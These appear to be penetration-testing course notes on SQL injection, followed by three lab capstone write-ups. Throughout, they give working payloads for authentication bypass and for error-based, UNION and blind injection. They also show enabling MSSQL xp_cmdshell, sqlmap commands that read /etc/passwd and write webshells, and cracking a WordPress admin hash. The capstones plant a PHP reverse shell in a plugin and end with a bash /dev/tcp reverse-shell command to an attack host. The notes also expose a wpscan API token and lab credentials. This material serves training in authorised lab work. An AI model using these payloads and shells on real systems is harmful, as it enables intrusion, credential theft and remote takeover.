' '## 10.1 SQL Theory and Databases

### 10.1.2 DB Types and Characteristics

#### Connecting MySQL
```Shell
mysql -u root -p'root' -h 192.168.50.16 -P 3306
```

#### Retrieving the version of a MySQL database
```MySQL
select version();
```

#### Inspecting the current session's user
```MySQL
select system_user();
```

*The _root_ user in the course example is the database-specific root user, not the the system-wide administrative root user.*

#### Listing all Available Databases
```MySQL
show databases;
```

#### Inspecting user's encrypted password
```MySQL
SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
```
we'll filter using a **SELECT** statement for the **user** and **authentication_string** value belonging to the **user** table. Next, we'll filter all the results via a **WHERE** clause that matches only the **offsec** user.

#### Connecting to the Remote MSSQL instance via Impacket
```Shell
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```
Using the **-windows-auth** keyword forces NTLM authentication (as opposed to Kerberos)

#### Retrieving the Windows OS Version
```MSSQL
SELECT @@version;
```
Our query returned valuable information about the running version of the MSSQL server along with the Windows Server version, including its build number.

*Every database management system has its own syntax that we should take into consideration when enumerating a target during a penetration test.*

*When using a SQL Server command line tool like sqlcmd, we must submit our SQL statement ending with a semicolon followed by _GO_ on a separate line. However, when running the command remotely, we can omit the GO statement since it's not part of the MSSQL TDS protocol.*

#### Inspecting the Available Databases
```MSSQL
SELECT name FROM sys.databases;
```
Since _master_, _tempdb_, _model_, and _msdb_ are default databases, we want to explore the custom _offsec_ database because it might contain data belonging to our target

#### Inspecting the Available Tables in the offsec Database
```MSSQL
SELECT * FROM offsec.information_schema.tables;
```

#### Exploring Users Table Records
```MSSQL
select * from offsec.dbo.users;
```

## Manual SQL Exploitation

### 10.2.1 Identifying SQLi via Error-based Payloads

#### PHP Code Vulnerable to SQL injection
```PHP
<?php
$uname = $_POST['uname'];
$passwd =$_POST['password'];

$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
$result = mysqli_query($con, $sql_query);
?>
```
By forcing the closing quote on the _uname_ value and adding an _OR =1=1_ statement followed by a _--_ comment separator and two forward slashes (_//_), we can prematurely terminate the SQL statement.

#### Testing for SQLi Authentication Bypass
```
offsec' OR 1=1 -- //
```

#### Injected SQL statement
```MySQL
SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 --
```
Since we have appended an OR statement that will always be true, the WHERE clause will return the first user id present in the database, whether or not the record is present

#### Testing for SQLi Authentication Bypass 1
![[Pasted image 20230521093141.png]]
Because the offsec user's credentials are invalid, we receive an _Invalid Password_ error message

#### Testing for SQLi Authentication Bypass 2
![[Pasted image 20230521093156.png]]
We receive an SQL syntax error this time, meaning we are able to interact with the database.

*SQL injection is considered _in-band_ when the vulnerable application provides the result of the query along with the application-returned value. In this scenario, we've enabled SQL debugging inside the web application; however, most production-level web applications won't show these error messages because revealing SQL debugging information is considered a security flaw.*

#### SQLi payload inside the 'Username' field
![[Pasted image 20230521093328.png]]

#### Testing for SQLi Authentication Bypass 2
![[Pasted image 20230521093348.png]]

#### Error-based payload
```
' or 1=1 in (select @@version) -- //
```

#### Testing for Error-based payload
![[Pasted image 20230521093545.png]]

#### Attempting to retrieve the Users table
```
' OR 1=1 in (SELECT * FROM users) -- //
```

#### Testing for Error-based payload
![[Pasted image 20230521093701.png]]
This means we should only query one user at a time

#### Grabbing only the _password_ column from the _users_ table
```
' or 1=1 in (SELECT password FROM users) -- //
```

#### Retrieving Users Hashes
![[Pasted image 20230521093820.png]]

#### Improving our SQLi error-based payload
```
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

#### Retrieving Users Hashes
![[Pasted image 20230521093915.png]]

### 10.2.2 UNION-based Payloads

For **UNION** SQLi attacks to work, we first need to satisfy two conditions:

1.  The injected **UNION** query has to include the same number of columns as the original query.
2.  The data types need to be compatible between each column.

#### Vulnerable SQL Query
```PHP
$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
```
The query fetches all the records from the _customers_ table. It also includes the **LIKE**[2](https://portal.offsec.com/courses/pen-200-2023/books-and-videos/modal/modules/sql-injection-attacks/manual-sql-exploitation/union-based-payloads#fn2) keyword to search any _name_ values containing our input that are followed by zero or any number of characters, as specified by the percentage (_%_) operator.

#### Loading the Customer Search Portal
![[Pasted image 20230521094234.png]]
Click SEARCH w/o any query parameters

***Before crafting any attack strategy, we need to know the exact number of columns present in the target table.***

#### Verifying the exact number of columns
```
' ORDER BY 1-- //
```
The above statement orders the results by a specific column, meaning it will fail whenever the selected column does not exist. Increasing the column value by one each time, we'll discover that the table has five columns, since ordering by column six returns an error.

#### Finding the Exact Number of Columns
![[Pasted image 20230521094414.png]]

#### Enumerating the Database via SQL UNION Injection
```
%' UNION SELECT database(), user(), @@version, null, null -- //
```
Since we want to retrieve all the data from the _customers_ table, we'll use the percentage sign followed by a single quote to close the search parameter. Then, we begin our injected query with a **UNION SELECT** statement that dumps the current database name, the user, and the MySQL version in the first, second, and third columns, respectively, leaving the remaining two null.

#### Enumerating the Database
![[Pasted image 20230521094607.png]]
***The web application is explicitly omitting the output from the first column because IDs are not usually useful information for end users.*

#### Fixing the Injected UNION Query
```
' UNION SELECT null, null, database(), user(), @@version  -- //
```
![[Pasted image 20230521094715.png]]
This time, all three values returned correctly, including _offsec_ as the current database name.

#### Dumping the Current Database Tables Structure
```
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```
![[Pasted image 20230521094831.png]]
This output verifies that the three columns contain the table name, the column name, and the current database, respectively.

*The offsec database has customers and users tables. The customers table has the columns id, name, phone, address, and country. The users table has the columns id, username, password, and description.*

#### Retrieving Current Database Tables and Columns
```
' UNION SELECT null, username, password, description, null FROM users -- //
```
![[Pasted image 20230521095223.png]]

### 10.2.3 Blind SQL Injections

#### Testing for Blind SQLi
![[Pasted image 20230521115630.png]]
Closely reviewing the URL, we'll notice that the application takes a _user_ parameter as input, defaulting to _offsec_ since this is our current logged-in user.  The application then queries the user's record, returning the _Username_, _Password Hash_, and _Description_ values.

#### Testing for boolean-based SQLi
```
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
```
Since _1=1_ will always be TRUE, the application will return the values only if the user is present in the database. Also, the double slashes were necessary to prevent space from being deleted off the end.

#### Testing for time-based SQLi
```
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```
We appended an IF condition that will always be true inside the statement itself, but will return false if the user is non-existent. We know the user _offsec_ is active, so we if paste the above URL payload in our Kali VM's browser, we'll notice that the application hangs for about three seconds.

## 10.3 Manual and Automated Code Execution

### 10.3.1 Manual Code Execution

#### Enabling xp_cmdshell feature
```Shell
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```
Login to MSSQL

```MSSQL
EXECUTE sp_configure 'show advanced options', 1;
```
We can enable _show advanced options_ by setting its value to 1

```MSSQL
RECONFIGURE;
```
Changes are applied by running RECONFIGURE

```MSSQL
EXECUTE sp_configure 'xp_cmdshell', 1;
```
xp_cmdshell enabled command

```MSSQL
RECONFIGURE;
```
Changes applied 

#### Executing Commands via xp_cmdshell
```MSSQL
EXECUTE xp_cmdshell 'whoami';
```

#### Write a WebShell To Disk via INTO OUTFILE directive
![[select into out.png]]
The PHP _system_ function will parse any statement included in the _cmd_ parameter coming from the client HTTP REQUEST, thus acting like a web-interactive command shell.

#### Writing the WebShell to Disk
![[Pasted image 20230521122943.png]]
The above input is written into the SQLi vulnerable field. Fortunately, this error is related to the incorrect return type, and should not impact writing the webshell on disk.

#### Accessing the Webshell
![[Pasted image 20230521123008.png]]

### 10.3.2 Automating the Attack

#### Running sqlmap to quickly find SQL injection points
```Shell
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
```
We will set the URL we want to scan with **-u** and specify the parameter to test using **-p**. We submitted the entire URL after the _-u_ specifier together with the _?user_ parameter set to a dummy value.

#### Running sqlmap to Dump Users Credentials Table
```Shell
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
```

#### (OS-Shell) Intercepting the POST request with Burp
```
POST /search.php HTTP/1.1
Host: 192.168.50.19
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0

Upgrade-Insecure-Requests: 1

item=test
```
Save this as a .txt file (in next command this is post.txt)

#### Running sqlmap with os-shell
```Shell
sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
```
we can invoke **sqlmap** with the **-r** parameter, using our file containing the POST request as an argument. We also need to indicate which parameter is vulnerable to sqlmap, in our case _item_. Finally, we'll include **--os-shell** along with the custom writable folder we found earlier.

Once sqlmap confirms the vulnerability, it prompts us for the language the web application is written in, which is PHP in this case

## Capstone 1 Write-Up

The first capstone exercise featured an SQL injection vulnerability that allowed a password to be discovered and cracked. This enabled the tester to authenticate to the WordPress site as an admin user and modify the Askimet plugin with a reverse shell that connected to a netcat listener.

### The Attack Path the tester followed was:
1. Added alvida-eatery.org to /etc/hosts file w/ the provided IP address
2. Ran wpscan on the address, which identified an unauthenticated SQL injection vulnerability
3. This injection disclosed a password hash in an API
4. The password hash was cracked, providing access 

#### Detailed Steps for this engagement:

On the home page of the web application, there was a URL in the `ABOUT` section of the web page.
![[alvida-eatery_org.png]]

This was added to the `/etc/hosts` file with the provided IP address.
![[etc-hosts.png]]

This allowed the tester access to this website. From there, the tester ran ffuf to fuzz the directories of the web application and obtain further information about the target.
```Shell
ffuf -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://alvida-eatery.org/FUZZ

<SNIP>

wp-content              [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 60ms]
# directory-list-2.3-small.txt [Status: 200, Size: 80244, Words: 3700, Lines: 1096, Duration: 3776ms]
wp-includes             [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 112ms]
<SNIP>
wp-admin                [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 68ms]
```

The output from ffuf shows that the web application is running WordPress. The tester ran wpscan against the application to identify more information about the webpage, including potential vulnerabilities that could be exploited.
```Shell
wpscan --url http://alvida-eatery.org --enumerate --api-token 0qSWF2tHdeezcVNms7KTJRci1xA4KIi7GznJrl7LscI

<SNIP>
 | [!] Title: Perfect Survey < 1.5.2 - Unauthenticated SQL Injection
 |     Fixed in: 1.5.2
 |     References:
 |      - https://wpscan.com/vulnerability/c1620905-7c31-4e62-80f5-1d9635be11ad
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24762

<SNIP>
```

This scan showed that an unauthenticated SQL injection vulnerability existed on the web application. The link referenced under wpscan.com provided the information to input into the URL in order to exploit this vulnerability.
![[SQLi path.png]]

This path was appended to the alvida-eatery.org URL.
```
http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cuser_pass%2C0%2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users 
```

The injection revealed a JSON API with outputs from the backend SQL database, including a potential password hash for the admin user.
![[sqli output.png]]
![[sqli output zoom.png]]

The "`$P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0`" hash was fed to Hashcat and was able to successfully identify the associated password using the `rockyou.txt` password list.
```cmd.exe
hashcat $P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0 rockyou.txt

<SNIP>
$P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0:hulabaloo

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 400 (phpass)
Hash.Target......: $P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0

Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
<SNIP>
```

The password for the admin user was "hulabaloo". This allowed the tester to log in to the application as the admin user. The login page was located at `http://alvida-eatery.org/wp-login.php`

The tester went to the "Plugins" menu and then to "Installed Plugins."
![[to plugins 1.png]]

From there, the tester clicked on the Akismet Anti-Spam plugin, then went back to the Plugins menu and to the "Plugin File Editor."
![[plugin edit.png]]

This provided the tester the ability to edit the source PHP source code for the akismet plugin.
![[askimet 1.png]]

The tester inserted the PHP PentestMonkey reverse shell into the code, removing the beginning and terminal syntax (i.e., `<?php` and `?>`) so the remainder of the script was still able to execute.
![[revshell insert.png]]

The tester then clicked `Update File` and went back to the `Installed Plugins` page. Once the tester was back on the `Installed Plugins` page, a netcat listener was started on the attack host.
```Shell
nc -lnvp 4443
```


## Capstone 2 Write-Up

The SQLi vulnerability was discovered in the `Subscribe Our Newsletter` field
![[subscribe field.png]]

When intercepted with Burp Suite, the field was able to be recognized as a possible injection location
![[location.png]]

The request was copied and pasted into a .txt file, then run through sqlmap.
```Shell
sqlmap -r inject.txt
```

This revealed the field was vulnerable to multiple types of SQL injection. Nothing of interest was found in the databases, so the tester attempted to use sqlmap to read the `/etc/passwd` file.
```Shell
sqlmap -r inject.txt --file-read "/etc/passwd"
```

The file was able to be read successfully. Next the tester used sqlmap to determine if a file could be uploaded as a webshell and executed. The file was a PHP cmd shell.
```Shell
sqlmap -r inject.txt --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

The file was uploaded successfully. Using curl, the tester was able to achieve RCE on the web application.
```Shell
curl "http://192.168.235.48/shell.php?cmd=ls"
```

Next the tester uploaded a reverse shell using the Pentest Monkey reverse shell from revshells.com.
```Shell
sqlmap -r inject.txt --file-write "rev.php" --file-dest "/var/www/html/rev.php"
```

A netcat listener was started in order to catch the reverse shell once it was executed.
```Shell
nc -lnvp 4443
```

Then the curl command was used to execute the PHP reverse shell on the web application.
```Shell
curl "http://192.168.235.48/rev.php" 
```

## Capstone 3 Write-up

Looking at the Network tab on the Inspector functionality enabled the tester to discover the `/lib` directory on the web application.
![[waypoint.png]]
![[lib find.png]]

Visiting this page revealed the sitemap for the website with several directories. Specifically of note was the `/flaticon` directory.
![[lib.png]]

Visiting the `/lib/flaticon` directory revealed a 'backup.txt' page/file.
![[backup find.png]]

This page featured content encoded in base64.
![[base64 backup.png]]

This was decoded in command line.
![[decoded 1.png]]

It was then prettified at https://beautifier.io.
![[pretty.png]]'

The code appeared to correspond to a JSON API that was being pulled in to part of the web application. The location for this was found in the sign-up form on the `/class.php` page.
![[sgnup.png]]
![[injection point 1.png]]

The POST request was copied and pasted into a .txt file and plugged into sqlmap, which revealed the `height` parameter to be vulnerable to SQLi.
```

```

```Shell
sqlmap -r subscribe.txt
```

The tester was able to upload an os-command shell using sqlmap.
```Shell
sqlmap -r subscribe.txt -p height --os-shell  --web-root "/var/www/html/tmp"
```

This allowed the tester to setup a netcat listener, then execute a reverse shell on the os-command shell in sqlmap that connected to the netcat listener.

`netcat listener:`
```Shell
nc -lnvp 4443
```

`reverse shell command on sqlmap:`
```Shell
os-shell> bash -c "bash -i >& /dev/tcp/192.168.45.197/4443 0>&1"
```
